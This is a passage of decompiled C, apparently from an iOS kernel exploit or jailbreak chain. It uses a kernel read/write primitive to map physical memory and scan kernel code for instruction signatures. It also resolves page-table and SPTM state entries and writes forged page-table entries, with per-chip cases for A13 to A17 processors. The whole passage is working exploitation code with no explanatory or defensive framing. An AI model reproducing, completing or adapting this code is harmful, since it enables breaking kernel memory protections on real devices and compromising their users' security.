                                                  *((uint64_t *)v4 + 19) = *((uint64_t *)v4 + 5);
                                                  if ( !(unsigned int)physmap_map_cached(
                                                                        krwCtx,
                                                                        v90,
                                                                        (__int64)(v4 + 24)) )
                                                  {
                                                    *((uint64_t *)v4 + 20) = *((uint64_t *)v4 + 12);
                                                    goto LABEL_67;
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                        goto LABEL_66;
                      }
                    }
                  }
                }
              }
              if ( (unsigned int)++v35 >= *(uint32_t *)v316 )
                break;
            }
          }
        }
      }
    }
  }
  v4[2] = 0;
LABEL_66:
  *(uint8_t *)v28 = 1;
LABEL_67:
  has_flag = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17);
  if ( has_flag )
    v40 = 0x292050000LL;
  else
    v40 = 0x206050000LL;
  if ( has_flag )
    v41 = 0xFFFFFC0000000000LL;
  else
    v41 = 0xFFFFFF8000000000LL;
  v1 = physmap_map_cached(krwCtx, v40, (__int64)inputStruct);
  if ( (uint32_t)v1 )
    goto LABEL_27;
  v42 = **(uint64_t **)inputStruct;
  v43 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16_A17_MASK);
  v44 = -2;
  if ( !v43 )
    v44 = 0xFFFFFFFFELL;
  v45 = v44 & v42;
  physmap_unmap_cached(krwCtx, (__int64)inputStruct);
  *((uint64_t *)v4 + 33) = v45;
  v46 = read_cryptex_manifest(krwCtx, v45);
  *((uint64_t *)v4 + 31) = v46;
  v47 = 163855;
  if ( !v46 )
    goto LABEL_370;
  v1 = physmap_map_cached(krwCtx, *((uint64_t *)v4 + 33), (__int64)inputStruct);
  if ( (uint32_t)v1 )
    goto LABEL_27;
  v48 = *(__int64 **)inputStruct;
  do
    v49 = *v48++;
  while ( v49 != 0x7777777777777700LL );
  v50 = *(v48 - 5);
  *((uint64_t *)v4 + 38) = v50;
  v51 = *(v48 - 4) - v50;
  *((uint64_t *)v4 + 37) = v41;
  *((uint64_t *)v4 + 39) = v50 - v41;
  *((uint64_t *)v4 + 40) = v51;
  *((uint64_t *)v4 + 36) = *v48;
  *((uint64_t *)v4 + 35) = v48[7];
  physmap_unmap_cached(krwCtx, (__int64)inputStruct);
  v52 = *((uint64_t *)v4 + 33);
  v53 = *((uint64_t *)v4 + 39);
  v54 = krwCtx->pageSizeOrSomething;
  LODWORD(outputStruct) = 3;
  LODWORD(input[0]) = 3;
  v55 = vm_allocate(mach_task_self_, address, v53, 1);
  if ( v55 )
  {
LABEL_81:
    v7 = v55 | 0x80000000;
    goto LABEL_26;
  }
  if ( v53 >= v54 )
  {
    v56 = 0;
    if ( v53 / v54 <= 1 )
      v57 = 1;
    else
      v57 = v53 / v54;
    while ( 1 )
    {
      v58 = physmap_map_cached(krwCtx, v52 + v56 * krwCtx->pageSizeOrSomething, (__int64)src_address);
      if ( (uint32_t)v58 )
        break;
      v59 = krwCtx->pageSizeOrSomething;
      target_address[0] = address[0] + v56 * v59;
      v55 = vm_remap(
              mach_task_self_,
              target_address,
              v59,
              0,
              0x4000,
              mach_task_self_,
              src_address[0],
              0,
              (vm_prot_t *)&outputStruct,
              (vm_prot_t *)input,
              1u);
      if ( v55 )
        goto LABEL_81;
      if ( ++v56 == v57 )
        goto LABEL_89;
    }
    v7 = v58;
    goto LABEL_26;
  }
LABEL_89:
  v60 = 0;
  v61 = 0;
  *((uint64_t *)v4 + 41) = address[0];
  *((uint64_t *)v4 + 42) = v53;
  v62 = krwCtx->dmaFailCtx;
  v63 = *(uint64_t *)(v62 + 296);
  v64 = *((uint64_t *)v4 + 34);
  v65 = *(uint64_t *)(v62 + 328);
  v66 = (unsigned __int8 *)(*((uint64_t *)v4 + 36) - v63 + v65);
  v67 = (unsigned __int8 *)(*((uint64_t *)v4 + 35) - v63 + v65);
  do
  {
    v68 = *v66++;
    v64 |= (unsigned __int64)v68 << v60;
    *((uint64_t *)v4 + 34) = v64;
    v69 = *v67++;
    v61 |= (unsigned __int64)v69 << v60;
    v60 += 8;
  }
  while ( v60 != 64 );
  v70 = read_cryptex_manifest(krwCtx, v64);
  *((uint64_t *)v4 + 32) = v70;
  if ( !v70 )
    goto LABEL_26;
  v71 = read_cryptex_manifest(krwCtx, v61);
  *((uint64_t *)v4 + 74) = v71;
  if ( !v71 )
    goto LABEL_26;
  v343 = xmmword_43060;
  *(__int128 *)v316 = xmmword_43070;
  v72 = scan_physmap_state_entries(krwCtx, &v343, v316, 4u);
  if ( !v72
    || ((v74 = *((uint32_t *)v72 + 2),
         v75 = *((unsigned int *)v72 + 3),
         v73 = v72 + 8,
         v76 = (v75 >> 10) & 0xFFF,
         (v75 & 0x40000000) == 0)
      ? (v77 = 2)
      : (v77 = 3),
        (unsigned int)lookup_sptm_state_entry(
                        krwCtx,
                        (v76 << v77)
                      + (int)((((v74 >> 3) & 0xFFFFFFFC) | ((v74 >> 29) & 3)) << 12)
                      + ((unsigned __int64)&v73[*(uint64_t *)(krwCtx->dmaFailCtx + 296LL)
                                              - *(uint64_t *)(krwCtx->dmaFailCtx + 328LL)]
                       & 0xFFFFFFFFFFFFF000LL),
                        inputStruct)) )
  {
    *((uint64_t *)v4 + 43) = 0;
    goto LABEL_26;
  }
  v220 = *(uint64_t *)inputStruct == -72;
  *((uint64_t *)v4 + 43) = *(uint64_t *)inputStruct + 72LL;
  if ( v220 )
    goto LABEL_26;
  v78 = (uint64_t *)krwCtx->dmaFailCtx;
  v80 = (char *)v78[41];
  v79 = v78[42];
  v81 = (unsigned __int64)&v80[v79];
  if ( v80 >= &v80[v79] )
    goto LABEL_144;
  v82 = 0;
  while ( *(uint32_t *)&v80[v82] != -717500319 )
  {
    v82 += 4;
    if ( (unsigned __int64)&v80[v82] >= v81 )
      goto LABEL_144;
  }
  if ( (unsigned __int64)&v80[v82 + 4] >= v81 )
  {
LABEL_144:
    *((uint64_t *)v4 + 44) = 0;
    goto LABEL_26;
  }
  v92 = v78[37];
  *((uint64_t *)v4 + 44) = v92 + v82;
  if ( !(v92 + v82) )
    goto LABEL_26;
  *(uint64_t *)&v343 = 0xD65F03C0F8226801LL;
  *(uint64_t *)v316 = -1;
  v93 = scan_physmap_state_entries(krwCtx, &v343, v316, 2u);
  if ( !v93 )
  {
    *((uint64_t *)v4 + 45) = 0;
    goto LABEL_26;
  }
  *((uint64_t *)v4 + 45) = v93 - v80 + v92;
  if ( !(v93 - v80 + v92) )
    goto LABEL_26;
  while ( 1 )
  {
    v94 = *(uint32_t *)v80;
    v80 += 4;
    if ( v94 == -1861991455 )
      break;
    v92 += 4;
    if ( (unsigned __int64)v80 >= v81 )
      goto LABEL_172;
  }
  if ( (unsigned __int64)v80 >= v81 )
  {
LABEL_172:
    *((uint64_t *)v4 + 46) = 0;
    goto LABEL_26;
  }
  *((uint64_t *)v4 + 46) = v92;
  if ( !v92 )
  {
LABEL_26:
    v1 = v7;
    goto LABEL_27;
  }
  v344[0] = 0;
  v343 = 0u;
  *(uint32_t *)((char *)v344 + 7) = 0;
  v98 = calloc(krwCtx->pageSizeOrSomething, 1u);
  if ( !v98 )
  {
LABEL_213:
    *((uint64_t *)v4 + 48) = 0;
    goto LABEL_26;
  }
  v99 = v98;
  v100 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17);
  if ( v100 )
    v101 = 0xFFFFFC200008C000LL;
  else
    v101 = 0xFFFFFFA00008C000LL;
  if ( v100 )
    v102 = 0xFFFFFC2000020000LL;
  else
    v102 = 0xFFFFFFA000020000LL;
  v103 = v102;
  do
  {
    v104 = read_pgtable_entry(krwCtx, v103, 0, 0);
    if ( !v104 )
    {
      v106 = krwCtx->pageSizeOrSomething;
      *((uint8_t *)&v344[-2] + (v103 - v102) / v106) = -1;
      goto LABEL_169;
    }
    if ( (unsigned int)physmap_map_cached(krwCtx, v104, (__int64)inputStruct) )
    {
LABEL_212:
      free(v99);
      goto LABEL_213;
    }
    v105 = krwCtx->pageSizeOrSomething;
    if ( !memcmp(*(const void **)inputStruct, v99, v105) )
      *((uint8_t *)&v344[-2] + (v103 - v102) / v105) = 1;
    physmap_unmap_cached(krwCtx, (__int64)inputStruct);
    v106 = krwCtx->pageSizeOrSomething;
LABEL_169:
    v103 += v106;
  }
  while ( v103 < v101 );
  if ( BYTE13(v343) == 1 )
  {
    v107 = v102 + 13 * v106;
    free(v99);
    *((uint64_t *)v4 + 48) = v107;
    goto LABEL_191;
  }
  v115 = 0;
  while ( v115 != 13 )
  {
    v116 = *((unsigned __int8 *)&v343 + v115++ + 14);
    if ( v116 == 1 )
    {
      v117 = v115 + 13;
      goto LABEL_190;
    }
  }
  v117 = 12;
  while ( *((uint8_t *)&v344[-2] + v117) != 1 )
  {
    if ( !--v117 )
      goto LABEL_212;
  }
LABEL_190:
  v118 = v102 + v117 * v106;
  free(v99);
  *((uint64_t *)v4 + 48) = v118;
  if ( !v118 )
    goto LABEL_26;
LABEL_191:
  v119 = (uint64_t *)krwCtx->dmaFailCtx;
  v343 = xmmword_43080;
  LODWORD(v344[0]) = 335544320;
  *(__int128 *)v316 = xmmword_43090;
  *(uint32_t *)&v316[16] = -67108864;
  v120 = scan_physmap_state_entries(krwCtx, &v343, v316, 5u);
  if ( !v120 )
  {
    *((uint64_t *)v4 + 51) = 0;
    goto LABEL_26;
  }
  v121 = v119[41];
  v122 = v119[37];
  v123 = &v120[v122 - v121];
  v125 = *((uint32_t *)v120 + 1);
  v124 = v120 + 4;
  v126 = ((unsigned __int64)v125 >> 3) & 0x1FFFFC;
  v127 = (((unsigned __int64)v125 >> 3) & 0xFFFFC) | 0xFFFFFFFFFFF00000LL;
  if ( (((unsigned __int64)v125 >> 3) & 0x100000) != 0 )
    v128 = v127;
  else
    v128 = v126;
  v129 = (unsigned __int64)&v124[v122 - v121 + v128];
  if ( !(unsigned int)lookup_sptm_state_entry(krwCtx, v129, (uint64_t *)v4 + 52) && krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13) )
    v119[56] = v129;
  *((uint64_t *)v4 + 51) = v123;
  if ( !v123 || !*((uint64_t *)v4 + 52) || (krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13) && !*((uint64_t *)v4 + 56)) )
    goto LABEL_26;
  *(uint64_t *)inputStruct = 0xD5033FDFD5033F9FLL;
  *(uint32_t *)&inputStruct[8] = -698416192;
  *(uint64_t *)&v343 = -1;
  DWORD2(v343) = -1;
  v130 = scan_physmap_state_entries(krwCtx, inputStruct, &v343, 3u);
  if ( !v130 )
  {
    *((uint64_t *)v4 + 53) = 0;
    goto LABEL_26;
  }
  v131 = (uint64_t *)krwCtx->dmaFailCtx;
  v132 = (char *)v131[41];
  v133 = v131[37];
  *((uint64_t *)v4 + 53) = v130 - v132 + v133;
  if ( !(v130 - v132 + v133) )
    goto LABEL_26;
  v134 = &v132[v131[42]];
  if ( v132 >= v134 )
    goto LABEL_249;
  while ( 1 )
  {
    v135 = *(uint32_t *)v132;
    v132 += 4;
    if ( v135 == 335544320 )
      break;
    v133 += 4;
    if ( v132 >= v134 )
      goto LABEL_249;
  }
  if ( v132 >= v134 )
  {
LABEL_249:
    *((uint64_t *)v4 + 54) = 0;
    goto LABEL_26;
  }
  *((uint64_t *)v4 + 54) = v133;
  if ( !v133 )
    goto LABEL_26;
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13_A14_MASK) )
    goto LABEL_221;
  v343 = xmmword_430A0;
  *(uint64_t *)v316 = -1;
  *(uint64_t *)&v316[8] = -1;
  v137 = scan_physmap_state_entries(krwCtx, &v343, v316, 4u);
  if ( !v137 )
  {
    *((uint64_t *)v4 + 55) = 0;
    goto LABEL_26;
  }
  v138 = &v137[*(uint64_t *)(krwCtx->dmaFailCtx + 296LL) - *(uint64_t *)(krwCtx->dmaFailCtx + 328LL)];
  *((uint64_t *)v4 + 55) = v138;
  if ( !v138 )
    goto LABEL_26;
LABEL_221:
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13) )
    goto LABEL_269;
  *(__int128 *)inputStruct = xmmword_430B0;
  *(uint64_t *)&inputStruct[16] = 3573563583LL;
  v343 = xmmword_430C0;
  v344[0] = 0xFFFFFFFFLL;
  v139 = scan_physmap_state_entries(krwCtx, inputStruct, &v343, 6u);
  if ( !v139 )
  {
    *((uint64_t *)v4 + 60) = 0;
    goto LABEL_26;
  }
  v140 = *(unsigned int *)v139;
  v141 = ((v140 >> 3) & 0x1FFFFC) | ((v140 >> 29) & 3);
  if ( ((v140 >> 3) & 0x100000) != 0 )
    v141 |= 0xFFFFFFFFFFF00000LL;
  v142 = krwCtx->dmaFailCtx;
  v143 = *(uint64_t *)(v142 + 328);
  v144 = *(uint64_t *)(v142 + 296);
  v145 = &v139[v144 - v143 + v141];
  if ( (unsigned int)v140 >> 5 == 111724032 )
  {
LABEL_230:
    v149 = *((uint32_t *)v139 - 2);
    v148 = v139 - 8;
    v150 = (((unsigned __int64)v149 >> 3) & 0x1FFFFC) | (((unsigned __int64)v149 >> 29) & 3);
    v151 = v150 | 0xFFFFFFFFFFF00000LL;
    if ( (((unsigned __int64)v149 >> 3) & 0x100000) == 0 )
      v151 = v150;
    *((uint64_t *)v4 + 57) = &v148[v144 - v143 + v151];
  }
  else
  {
    v146 = 0;
    while ( (uint32_t)v146 != 112 )
    {
      v147 = *(uint32_t *)&v139[v146 + 4] & 0xFFFFFFE0;
      v146 += 4;
      if ( v147 == -719798272 )
      {
        v139 += v146;
        goto LABEL_230;
      }
    }
  }
  *((uint64_t *)v4 + 60) = v145;
  if ( !v145 || !*((uint64_t *)v4 + 57) )
    goto LABEL_26;
  *(uint64_t *)&v343 = 0xD65F03C000201421LL;
  *(uint64_t *)v316 = -1;
  v152 = scan_physmap_state_entries(krwCtx, &v343, v316, 2u);
  if ( !v152 )
  {
    *((uint64_t *)v4 + 58) = 0;
    goto LABEL_26;
  }
  v153 = *(uint64_t *)(v142 + 296);
  *((uint64_t *)v4 + 58) = &v152[v153 - v143];
  if ( !&v152[v153 - v143] )
    goto LABEL_26;
  v343 = xmmword_430D0;
  LODWORD(v344[0]) = 683767869;
  *(__int128 *)v316 = xmmword_430E0;
  *(uint32_t *)&v316[16] = -1;
  v154 = scan_physmap_state_entries(krwCtx, &v343, v316, 5u);
  if ( !v154 )
  {
    *((uint64_t *)v4 + 59) = 0;
    goto LABEL_26;
  }
  *((uint64_t *)v4 + 59) = &v154[v153 - v143];
  if ( !&v154[v153 - v143] )
    goto LABEL_26;
  *(uint64_t *)&v343 = 0x201400A8C17BFDLL;
  *(uint64_t *)v316 = -1;
  v155 = scan_physmap_state_entries(krwCtx, &v343, v316, 2u);
  if ( !v155 )
  {
    *((uint64_t *)v4 + 61) = 0;
    goto LABEL_26;
  }
  *((uint64_t *)v4 + 61) = &v155[v153 - v143];
  if ( !&v155[v153 - v143] )
    goto LABEL_26;
  v343 = xmmword_430F0;
  *(uint64_t *)v316 = -1;
  *(uint64_t *)&v316[8] = -1;
  v156 = scan_physmap_state_entries(krwCtx, &v343, v316, 4u);
  if ( !v156 )
  {
    *((uint64_t *)v4 + 62) = 0;
    goto LABEL_26;
  }
  *((uint64_t *)v4 + 62) = &v156[v153 - v143];
  if ( !&v156[v153 - v143] )
    goto LABEL_26;
  *(uint64_t *)inputStruct = 3577217186LL;
  *(uint32_t *)&inputStruct[8] = -1442839579;
  *(uint64_t *)&v343 = 0xFFFFFFFFLL;
  DWORD2(v343) = -1;
  v157 = scan_physmap_state_entries(krwCtx, inputStruct, &v343, 3u);
  if ( !v157
    || ((v158 = v157,
         v159 = (unsigned __int64 *)(v4 + 130),
         v160 = *((unsigned int *)v157 + 4),
         ((v160 >> 3) & 0x100000) != 0)
      ? (v161 = ((v160 >> 3) & 0xFFFFC) | 0xFFFFFFFFFFF00000LL)
      : (v161 = (v160 >> 3) & 0x1FFFFC),
        v162 = (unsigned __int64)&v157[v153 - v143 + 16 + v161],
        *v159 = v162,
        (unsigned int)lookup_sptm_state_entry(krwCtx, v162, (uint64_t *)v4 + 65)) )
  {
    *((uint64_t *)v4 + 63) = 0;
    goto LABEL_26;
  }
  v163 = &v158[v153 - v143];
  *((uint64_t *)v4 + 63) = v163;
  if ( !v163 || !*v159 )
    goto LABEL_26;
  v343 = xmmword_43100;
  LODWORD(v344[0]) = -700514048;
  *(__int128 *)v316 = xmmword_43110;
  *(uint32_t *)&v316[16] = -1;
  v164 = scan_physmap_state_entries(krwCtx, &v343, v316, 5u);
  if ( !v164 )
  {
    *((uint64_t *)v4 + 64) = 0;
    goto LABEL_26;
  }
  v165 = krwCtx->dmaFailCtx;
  v166 = *(uint64_t *)(v165 + 328);
  v167 = *(uint64_t *)(v165 + 296);
  *((uint64_t *)v4 + 64) = &v164[v167 - v166];
  if ( !&v164[v167 - v166] )
    goto LABEL_26;
  v343 = xmmword_43120;
  *(__int128 *)v316 = xmmword_43130;
  v168 = scan_physmap_state_entries(krwCtx, &v343, v316, 4u);
  if ( !v168
    || ((v170 = *((uint32_t *)v168 + 1),
         v169 = v168 + 4,
         v171 = ((unsigned __int64)v170 >> 3) & 0x1FFFFC,
         v172 = (((unsigned __int64)v170 >> 3) & 0xFFFFC) | 0xFFFFFFFFFFF00000LL,
         (((unsigned __int64)v170 >> 3) & 0x100000) != 0)
      ? (v173 = v172)
      : (v173 = v171),
        *(uint64_t *)inputStruct = &v169[v167 - v166 + v173],
        (unsigned int)lookup_sptm_state_entry(krwCtx, *(unsigned __int64 *)inputStruct, inputStruct)) )
  {
    *((uint64_t *)v4 + 66) = 0;
    goto LABEL_26;
  }
  v174 = *(uint64_t *)inputStruct;
  *((uint64_t *)v4 + 66) = *(uint64_t *)inputStruct;
  if ( !v174 )
    goto LABEL_26;
  *(__int128 *)(v4 + 134) = xmmword_43140;
  *(__int128 *)(v4 + 138) = xmmword_43150;
  *(__int128 *)(v4 + 142) = xmmword_43160;
  *((uint64_t *)v4 + 73) = 0xFFFFFFF002018000LL;
LABEL_269:
  v175 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17);
  v176 = 0xFFFFFC2000000000LL;
  if ( !v175 )
    v176 = 0xFFFFFFA000000000LL;
  v177 = vdup_n_s32(!v175);
  v178.i64[0] = v177.u32[0];
  v178.i64[1] = v177.u32[1];
  *((uint64_t *)v4 + 47) = v176;
  *(int8x16_t *)(v4 + 98) = vbslq_s8(
                              v178.i64[0] ? (int8x16_t){ -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1 } : (int8x16_t){ 0 },
                              (int8x16_t)xmmword_43180,
                              (int8x16_t)xmmword_43170);
  vm_deallocate(mach_task_self_, *((uint64_t *)v4 + 41), *((uint64_t *)v4 + 42));
  *((uint64_t *)v4 + 41) = 0;
  *((uint64_t *)v4 + 42) = 0;
  v1 = get_pgtable_walk_result(krwCtx, *((uint64_t *)v4 + 48), (uint64_t *)v4 + 75);
  if ( (uint32_t)v1 )
    goto LABEL_27;
  v1 = get_pgtable_walk_result(krwCtx, *((uint64_t *)v4 + 47), (uint64_t *)v4 + 85);
  if ( (uint32_t)v1 )
    goto LABEL_27;
  v1 = 708617;
  v179 = (uint64_t *)krwCtx->dmaFailCtx;
  LODWORD(size[0]) = 0x4000;
  v180 = alloc_physmap_page(krwCtx, (unsigned int *)size);
  if ( !v180 )
    goto LABEL_27;
  v181 = v180;
  pgtable_walk_wrapper(krwCtx, v180 & ~krwCtx->pageMask, (__int64)src_address);
  v182 = 0xFFFFFFFFLL;
  if ( !v183 || (v184 = src_address[4] & 0xFFFFFFFFC000LL, (src_address[4] & 0xFFFFFFFFC000LL) == 0) )
  {
LABEL_318:
    map_shared_mem_and_transfer_data(krwCtx, v181, LODWORD(size[0]));
    v1 = v182;
    goto LABEL_27;
  }
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13) )
    v185 = alloc_physmap_scratch_page(krwCtx, size);
  else
    v185 = alloc_physmap_page(krwCtx, (unsigned int *)size);
  v186 = v185;
  if ( !v185 )
  {
    v182 = 708617;
    goto LABEL_318;
  }
  pgtable_walk_wrapper(krwCtx, v185 & ~krwCtx->pageMask, (__int64)src_address);
  v182 = 0xFFFFFFFFLL;
  if ( !v187 )
    goto LABEL_317;
  v188 = src_address[4] & 0xFFFFFFFFC000LL;
  if ( (src_address[4] & 0xFFFFFFFFC000LL) == 0 )
    goto LABEL_317;
  v300 = alloc_physmap_page(krwCtx, (unsigned int *)size);
  if ( !v300 )
  {
    v182 = 708617;
LABEL_317:
    map_shared_mem_and_transfer_data(krwCtx, v186, LODWORD(size[0]));
    goto LABEL_318;
  }
  pgtable_walk_wrapper(krwCtx, v300, (__int64)&v343);
  if ( !v189 )
  {
    v182 = 0xFFFFFFFFLL;
LABEL_316:
    map_shared_mem_and_transfer_data(krwCtx, v300, LODWORD(size[0]));
    goto LABEL_317;
  }
  *(uint64_t *)v295 = v343;
  if ( !(unsigned int)krw_read_thunk(krwCtx, v343, 8, target_address) )
  {
    v182 = 163855;
    goto LABEL_316;
  }
  pgtable_walk_wrapper(krwCtx, *(uint64_t *)v295 & ~krwCtx->pageMask, (__int64)src_address);
  v182 = 0xFFFFFFFFLL;
  if ( !v190 )
    goto LABEL_316;
  v288 = src_address[4];
  if ( (src_address[4] & 0xFFFFFFFFC000LL) == 0 )
    goto LABEL_316;
  v290 = alloc_physmap_page(krwCtx, (unsigned int *)size);
  if ( !v290 )
  {
    v182 = 708617;
    goto LABEL_316;
  }
  pgtable_walk_wrapper(krwCtx, v290, (__int64)&v343);
  if ( !v191 )
  {
    v182 = 0xFFFFFFFFLL;
    goto LABEL_315;
  }
  pgtable_walk_wrapper(krwCtx, v343 & ~krwCtx->pageMask, (__int64)src_address);
  v182 = 0xFFFFFFFFLL;
  if ( !v192 || (v287 = src_address[4] & 0xFFFFFFFFC000LL, (src_address[4] & 0xFFFFFFFFC000LL) == 0) )
  {
LABEL_315:
    map_shared_mem_and_transfer_data(krwCtx, v290, LODWORD(size[0]));
    goto LABEL_316;
  }
  if ( !(unsigned int)krw_read_thunk(krwCtx, v179[74], 64, inputStruct) )
  {
    v182 = 163855;
    goto LABEL_315;
  }
  if ( !(unsigned int)kwrite_with_retry(krwCtx, v181, (__int64)inputStruct, 64)
    || (*(uint64_t *)v316 = v188 | 3, !(unsigned int)kwrite_with_retry(krwCtx, v181 + 56, (__int64)v316, 8))
    || (address[0] = (v288 & 0xFFFFFE000000LL) | 0x20000000000445LL,
        !(unsigned int)kwrite_with_retry(krwCtx, v186, (__int64)address, 8)) )
  {
    v182 = 163856;
    goto LABEL_315;
  }
  v193 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17);
  v194 = 0xFFFFFC7000000000LL;
  if ( !v193 )
    v194 = 0xFFFFFFF000000000LL;
  v286 = v194;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14) )
  {
    v195 = alloc_physmap_scratch_page(krwCtx, size);
    if ( v195 )
    {
      v196 = v195;
      pgtable_walk_wrapper(krwCtx, v195 & ~krwCtx->pageMask, (__int64)src_address);
      v182 = 0xFFFFFFFFLL;
      if ( v197 )
      {
        v285 = src_address[4] & 0xFFFFFFFFC000LL;
        if ( (src_address[4] & 0xFFFFFFFFC000LL) != 0 )
        {
          read_pgtable_entry(krwCtx, v179[50], &outputStruct, 1);
          if ( outputStruct )
          {
            pgtable_walk_wrapper(krwCtx, outputStruct & ~krwCtx->pageMask, (__int64)src_address);
            v182 = 0xFFFFFFFFLL;
            if ( v198 )
            {
              v284 = src_address[4];
              if ( (src_address[4] & 0xFFFFFFFFC000LL) != 0 )
              {
                address[0] = (src_address[4] & 0xFFFFFE000000LL) | 0x20000000000445LL;
                if ( (unsigned int)kwrite_with_retry(krwCtx, v186 + 8, (__int64)address, 8) )
                {
                  if ( (unsigned int)krw_read_thunk(krwCtx, outputStruct, 8, input) )
                  {
                    v199 = (input[0] & 0xFFFF000000003FFFLL) | v285;
                    v200 = krwCtx->pageMask;
                    v179[102] = (v286 | (v284 & 0x1FFC000) | 0x2000000) + (v200 & outputStruct);
                    v179[103] = v199;
                    goto LABEL_320;
                  }
                  v182 = 163855;
                }
                else
                {
                  v182 = 163856;
                }
              }
            }
          }
          else
          {
            v182 = 0xFFFFFFFFLL;
          }
        }
      }
      map_shared_mem_and_transfer_data(krwCtx, v196, LODWORD(size[0]));
    }
    else
    {
      v182 = 708617;
    }
    goto LABEL_315;
  }
  v200 = krwCtx->pageMask;
LABEL_320:
  v201 = (target_address[0] & 0xFFFF000000003FFFLL) | v287;
  v179[95] = v184;
  v179[96] = v181;
  v179[97] = v186;
  v179[98] = v286;
  v179[99] = *(uint64_t *)v295;
  v179[100] = (v286 | (v288 & 0x1FFC000)) + (v200 & *(uint64_t *)v295);
  v179[101] = v201;
  v179[162] = ((v290 >> 11) & 0x3FF8) + v300;
  v179[163] = v290;
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13) )
  {
LABEL_382:
    v232 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13);
    v233 = krwCtx->dmaFailCtx;
    v234 = *(uint64_t **)(v233 + 600);
    v235 = *(uint64_t *)(v233 + 608);
    if ( v232 )
    {
      if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
        v236 = 832;
      else
        v236 = 848;
      v1 = physmap_map_cached(krwCtx, 0x23B080000uLL, (__int64)inputStruct);
      if ( (uint32_t)v1 )
        goto LABEL_431;
      v303 = *(uint64_t *)inputStruct;
      v237 = *(uint64_t *)(v233 + 936);
      v294 = *(uint64_t **)(v233 + 1104);
      *(uint64_t *)v299 = *(uint64_t *)(v233 + 992);
      v238 = krwCtx->pageSizeOrSomething;
      v1 = lookup_sptm_state_entry(krwCtx, *(uint64_t *)(v233 + 344), src_address);
      if ( (uint32_t)v1 )
        goto LABEL_430;
      v239 = src_address[0];
      v240 = (char *)v234 + LOBYTE(src_address[0]);
      v241 = v240 + 3072;
      v242 = v235 + LOBYTE(src_address[0]) + 3072;
      v243 = 12800LL - LOBYTE(src_address[0]);
      v244 = *(uint64_t *)(v233 + 880);
      v234[1984] = *(uint64_t *)(v233 + 368);
      v234[1985] = 964;
      v234[2009] = v242 + 5 * v236;
      v234[2010] = *(uint64_t *)(v233 + 480);
      v234[2011] = v239;
      *((uint64_t *)v240 + 384) = *(uint64_t *)(v233 + 376);
      *((uint64_t *)v240 + 386) = 0;
      *((uint64_t *)v240 + 385) = 0;
      *((uint64_t *)v240 + 414) = *(uint64_t *)(v233 + 368);
      *((uint64_t *)v240 + 415) = v242 + v236;
      if ( *(uint8_t *)v233 )
        v245 = *(uint64_t *)(v233 + 360);
      else
        v245 = *(uint64_t *)(v233 + 360) + 4LL;
      *((uint64_t *)v240 + 416) = v245;
      *(__int128 *)(v240 + 3336) = xmmword_431D0;
      *((uint64_t *)v240 + 419) = 16;
      v246 = &v241[v236];
      *(uint64_t *)v246 = *(uint64_t *)(v233 + 848);
      *((uint64_t *)v246 + 30) = *(uint64_t *)(v233 + 368);
      *((uint64_t *)v246 + 32) = *(uint64_t *)(v233 + 464);
      *(__int128 *)&v241[v236 + 264] = xmmword_431D0;
      *((uint64_t *)v246 + 35) = 16;
      v247 = (__int64)&v241[v236 + v236];
      *(uint64_t *)v247 = *(uint64_t *)(v233 + 448);
      *(uint64_t *)(v247 + 8) = *(uint64_t *)(v233 + 864);
      *(uint64_t *)(v247 + 16) = 0;
      *(uint64_t *)(v247 + 240) = *(uint64_t *)(v233 + 368);
      *(uint64_t *)(v247 + 256) = *(uint64_t *)(v233 + 360);
      *(__int128 *)(v247 + 264) = xmmword_431D0;
      *(uint64_t *)(v247 + 280) = 16;
      v248 = v247 + v236;
      *(uint64_t *)v248 = *(uint64_t *)(v233 + 344);
      *(uint64_t *)(v248 + 8) = v239;
      *(uint64_t *)(v248 + 16) = 0;
      *(uint64_t *)(v248 + 240) = *(uint64_t *)(v233 + 368);
      *(uint64_t *)(v248 + 256) = *(uint64_t *)(v233 + 360);
      *(__int128 *)(v248 + 264) = xmmword_431D0;
      *(uint64_t *)(v248 + 280) = 16;
      v249 = (uint64_t *)(v248 + v236);
      *v249 = *(uint64_t *)(v233 + 832) + 224LL;
      v249[30] = *(uint64_t *)(v233 + 432);
      v249[32] = *(uint64_t *)(v233 + 472);
      *(__int128 *)(v248 + v236 + 264) = xmmword_431D0;
      v249[35] = 16;
      v250 = v248 + v236 + v236;
      *(uint64_t *)v250 = 0;
      *(uint64_t *)(v250 + 256) = *(uint64_t *)(v233 + 352);
      *(__int128 *)(v250 + 264) = xmmword_431E0;
      *(uint64_t *)(v250 + 280) = 16;
      if ( v236 - (__int64)v241 + v250 > v243 )
      {
        v1 = 0xFFFFFFFFLL;
        goto LABEL_430;
      }
      v269 = (uint64_t *)(*(uint64_t *)v299 + (unsigned int)(v238 - 16));
      *(uint64_t *)v244 = *(uint64_t *)(v233 + 552) + 224LL;
      *(uint64_t *)(v244 + 8) = *(uint64_t *)(v233 + 416) + 224LL;
      *(uint64_t *)(v244 + 16) = 56;
      *(uint64_t *)(v244 + 240) = *(uint64_t *)(v233 + 368);
      *(uint64_t *)(v244 + 256) = *(uint64_t *)(v233 + 496);
      *(__int128 *)(v244 + 264) = xmmword_431D0;
      *(uint64_t *)(v244 + 280) = 16;
      v270 = v244 + v236;
      *(uint64_t *)v270 = *(uint64_t *)(v233 + 552) + 264LL;
      *(uint64_t *)(v270 + 8) = *(uint64_t *)(v233 + 760);
